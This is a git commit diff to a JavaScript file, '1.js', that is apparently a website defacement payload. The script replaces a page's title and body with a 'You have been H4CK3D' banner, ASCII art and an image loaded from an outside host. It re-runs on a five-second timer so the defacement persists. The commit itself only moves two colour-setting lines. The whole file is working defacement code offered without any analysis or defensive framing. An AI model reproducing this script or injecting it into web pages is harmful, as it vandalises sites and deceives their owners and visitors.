d5e4d450c9073ce65ad08920d4bcb829ba47bf65
Hadariel <32524976+TechDedSec228@users.noreply.github.com>
2019-10-09 12:10:46 +0300

    Update 1.js

--- 1.js
+++ 1.js
@@ -1,4 +1,6 @@
 function myFunction() {
+  document.body.style.backgroundColor = "000000";
+  document.body.style.color = "20C20E";
   document.head.innerHTML = `<title>H4CK3D</title>
 <link rel="icon" href="https://dc8044.com/wp-content/themes/dc8044/favicon.ico">`
   document.body.innerHTML = `<MARQUEE><H1>You have been H4CK3D</H1></MARQUEE><table width="100%" cellspacing="0" cellpadding="0">
@@ -33,8 +35,6 @@ function myFunction() {
 :-----------------------------------------------------------------------------:
 '---._.-----------------------------------------------------------------._.---'
 </Pre></td><td class="rightcol"><img src="https://hadariel.space/h4cked.gif" height="400"></td></tr></tbody></table>`;
-document.body.style.backgroundColor = "000000";
-document.body.style.color = "20C20E";
 }
 document.onreadystatechange = myFunction()
 setTimeout(myFunction,5000);
